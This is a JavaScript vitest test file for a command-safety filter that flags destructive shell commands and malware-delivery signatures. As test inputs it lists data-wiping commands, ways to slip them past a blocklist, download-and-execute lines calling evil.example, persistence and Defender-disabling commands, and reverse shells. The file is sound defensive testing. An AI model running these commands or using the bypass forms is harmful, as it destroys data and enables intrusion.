'use strict';
import { test } from 'vitest';
import assert from 'node:assert';
import { DANGEROUS_CMDS, isDangerous, splitShellSegments, stripWrappers, unwrapSegment, findDeliverySignature } from '../../src/infra/dangerous-commands.js';

test('DANGEROUS_CMDS 非空数组', () => {
  assert.ok(Array.isArray(DANGEROUS_CMDS));
  assert.ok(DANGEROUS_CMDS.length >= 9);
  assert.ok(DANGEROUS_CMDS.every(p => p instanceof RegExp));
});

test('isDangerous 识别危险命令', () => {
  const dangerous = [
    'rm -rf /',
    'format C:',
    'del /f file',
    'rd /s dir',
    'rmdir /s /q C:\\test',
    'shutdown /s',
    'taskkill /im app.exe',
    'diskpart',
    'reg delete HKLM',
    'cipher /w C:',
    'Stop-Computer',
    'Restart-Computer',
    'Clear-Disk',
    'vssadmin delete shadows',
  ];
  for (const cmd of dangerous) {
    assert.strictEqual(isDangerous(cmd), true, cmd);
  }
});

test('isDangerous 识别安全命令', () => {
  assert.strictEqual(isDangerous('echo hello'), false);
  assert.strictEqual(isDangerous('dir'), false);
  assert.strictEqual(isDangerous('npm test'), false);
  assert.strictEqual(isDangerous('node main.js'), false);
  assert.strictEqual(isDangerous('git status && git log'), false);
});

test('isDangerous 忽略首尾空白', () => {
  assert.strictEqual(isDangerous('  shutdown /s  '), true);
});

// ===== 回归：复合命令绕过（P0 修复核心）=====
test('isDangerous 拦截 && 连接的复合命令', () => {
  assert.strictEqual(isDangerous('echo hi && rm -rf /'), true);
  assert.strictEqual(isDangerous('cd /tmp && format C:'), true);
  assert.strictEqual(isDangerous('echo ok && shutdown /s'), true);
});

test('isDangerous 拦截 || 连接的复合命令', () => {
  assert.strictEqual(isDangerous('true || rm -rf /'), true);
});

test('isDangerous 拦截 | 管道连接的复合命令', () => {
  assert.strictEqual(isDangerous('echo x | diskpart'), true);
});

test('isDangerous 拦截 ; 连接的复合命令', () => {
  assert.strictEqual(isDangerous('echo hi; taskkill /im a.exe'), true);
});

test('isDangerous 拦截换行连接的复合命令', () => {
  assert.strictEqual(isDangerous('echo hi\nshutdown /s'), true);
});

test('isDangerous 拦截 & 后台连接符', () => {
  assert.strictEqual(isDangerous('echo hi & format C:'), true);
});

test('isDangerous 不误伤含 && 的正常命令', () => {
  assert.strictEqual(isDangerous('npm install && npm test'), false);
  assert.strictEqual(isDangerous('git add . && git commit -m x'), false);
});

test('splitShellSegments 拆分复合命令', () => {
  assert.deepStrictEqual(splitShellSegments('a && b || c ; d | e & f'), ['a', 'b', 'c', 'd', 'e', 'f']);
  assert.deepStrictEqual(splitShellSegments('echo hi\nls'), ['echo hi', 'ls']);
  assert.deepStrictEqual(splitShellSegments('  '), []);
});

// ===== 022：前缀修饰 / 通配符 / 长选项 绕过（PR #30 的残留）=====
test('isDangerous 拦截前缀修饰词包裹的危险命令', () => {
  assert.strictEqual(isDangerous('sudo rm -rf /'), true);
  assert.strictEqual(isDangerous('sudo -u root rm -rf /'), true);
  assert.strictEqual(isDangerous('doas rm -rf /'), true);
  assert.strictEqual(isDangerous('env FOO=1 rm -rf /'), true);
  assert.strictEqual(isDangerous('nohup rm -rf /'), true);
});

test('isDangerous 拦截通配符根目录', () => {
  assert.strictEqual(isDangerous('rm -rf /*'), true);
  assert.strictEqual(isDangerous('rm -rf ~/*'), true);
});

test('isDangerous 拦截长选项与 --no-preserve-root', () => {
  assert.strictEqual(isDangerous('rm -rf --no-preserve-root /'), true);
  assert.strictEqual(isDangerous('rm --recursive --force /'), true);
  assert.strictEqual(isDangerous('rm -r -f /'), true);
});

test('isDangerous 拦截复合形式的前缀绕过', () => {
  assert.strictEqual(isDangerous('echo hi && sudo rm -rf /'), true);
  assert.strictEqual(isDangerous('cd /tmp; sudo rm -rf /'), true);
});

test('isDangerous 不误伤常规 rm 与 sudo', () => {
  assert.strictEqual(isDangerous('rm -rf ./dist'), false);
  assert.strictEqual(isDangerous('rm -rf build'), false);
  assert.strictEqual(isDangerous('rm -rf node_modules'), false);
  assert.strictEqual(isDangerous('rm file.txt'), false);
  assert.strictEqual(isDangerous('sudo npm test'), false);
  assert.strictEqual(isDangerous('sudo apt install curl'), false);
});

test('stripWrappers 剥除前导修饰词', () => {
  assert.strictEqual(stripWrappers('sudo rm -rf /'), 'rm -rf /');
  assert.strictEqual(stripWrappers('sudo -u root rm -rf /'), 'rm -rf /');
  assert.strictEqual(stripWrappers('npm install'), 'npm install');
});

// ===== A-004：六类黑名单绕过回归（poc-1 驱动）=====
test('A-004：PowerShell rm 别名 + -fo 连写被拦截', () => {
  assert.strictEqual(isDangerous('powershell -Command "rm -r -fo C:\\Users\\victim\\important"'), true);
  assert.strictEqual(isDangerous('rm -r -fo C:\\Users'), true);
});

test('A-004：Remove-Item 单独 -Recurse 即拦截（不再要求 -Force）', () => {
  assert.strictEqual(isDangerous('Remove-Item C:\\important -Recurse'), true);
});

test('A-004：cmd /c 包装剥除后内层仍被拦截', () => {
  assert.strictEqual(isDangerous('cmd /c "rmdir /s C:\\Windows\\System32"'), true);
});

test('A-004：iex 包装剥除后内层 Remove-Item 被拦截', () => {
  assert.strictEqual(isDangerous('iex "Remove-Item -Recurse -Force C:\\victim"'), true);
});

test('A-004：带值选项 --interactive=never 不再打断 rm 根目录判定', () => {
  assert.strictEqual(isDangerous('rm --interactive=never -rf /'), true);
  assert.strictEqual(isDangerous('rm -I -rf /'), true);
});

test('A-004：Git-Bash $HOME 根目录删除被拦截', () => {
  assert.strictEqual(isDangerous('rm -rf $HOME'), true);
});

test('A-004：解包函数剥 cmd/powershell/iex/引号', () => {
  assert.strictEqual(unwrapSegment('cmd /c "rmdir /s x"'), 'rmdir /s x');
  assert.strictEqual(unwrapSegment('powershell -NoProfile -Command "Remove-Item x"'), 'Remove-Item x');
  assert.strictEqual(unwrapSegment('iex "Remove-Item x"'), 'Remove-Item x');
});

test('A-004：正常命令不误伤', () => {
  assert.strictEqual(isDangerous('rm -r somedir'), false, '普通递归删目录');
  assert.strictEqual(isDangerous('rm -rf ./dist'), false);
  assert.strictEqual(isDangerous('rm -rf build'), false);
  assert.strictEqual(isDangerous('rm file.txt'), false);
  assert.strictEqual(isDangerous('Remove-Item old.zip'), false, 'PS 删单个文件无 -Recurse');
  assert.strictEqual(isDangerous('npm install'), false);
  assert.strictEqual(isDangerous('node server.js'), false);
  assert.strictEqual(isDangerous('curl https://example.com/data'), false);
});

// ===== 投递/反弹/持久化特征族（findDeliverySignature）=====
test('findDeliverySignature：各特征命中', () => {
  assert.ok(findDeliverySignature('powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA'));
  assert.ok(findDeliverySignature('powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-Date"'));
  assert.ok(findDeliverySignature('powershell -w hidden notepad.exe'));
  assert.ok(findDeliverySignature('iwr https://evil.example/x.ps1 | iex'));
  assert.ok(findDeliverySignature('irm https://evil.example/x | iex'));
  assert.ok(findDeliverySignature('iex (New-Object Net.WebClient).DownloadString("http://evil.example/x.ps1")'));
  assert.ok(findDeliverySignature('certutil -urlcache -f http://evil.example/x.exe C:\\temp\\x.exe'));
  assert.ok(findDeliverySignature('certutil -decode x.b64 x.exe'));
  assert.ok(findDeliverySignature('bitsadmin /transfer myjob http://evil.example/x.exe C:\\x.exe'));
  assert.ok(findDeliverySignature('mshta http://evil.example/x.hta'));
  assert.ok(findDeliverySignature('cscript http://evil.example/x.vbs'));
  assert.ok(findDeliverySignature('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /d C:\\x.exe'));
  assert.ok(findDeliverySignature('Add-MpPreference -DisableRealtimeMonitoring $true'));
  assert.ok(findDeliverySignature('Set-ExecutionPolicy Bypass -Scope Process -Force'));
  assert.strictEqual(findDeliverySignature('Set-ExecutionPolicy RemoteSigned -Scope CurrentUser'), null, '非 Bypass 的执行策略不命中');
  assert.ok(findDeliverySignature('nc -e /bin/sh 1.2.3.4 4444'));
  assert.ok(findDeliverySignature('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'));
});

test('findDeliverySignature：正常命令不命中', () => {
  assert.strictEqual(findDeliverySignature('npm install'), null);
  assert.strictEqual(findDeliverySignature('git status'), null);
  assert.strictEqual(findDeliverySignature('node server.js'), null);
  assert.strictEqual(findDeliverySignature('curl -O https://example.com/pkg.tgz'), null, '单纯下载不命中');
  assert.strictEqual(findDeliverySignature('echo hello'), null);
  assert.strictEqual(findDeliverySignature(''), null);
});

test('findDeliverySignature：命中返回中文描述', () => {
  const desc = findDeliverySignature('iwr https://evil.example/x.ps1 | iex');
  assert.ok(desc && desc.length > 0);
});
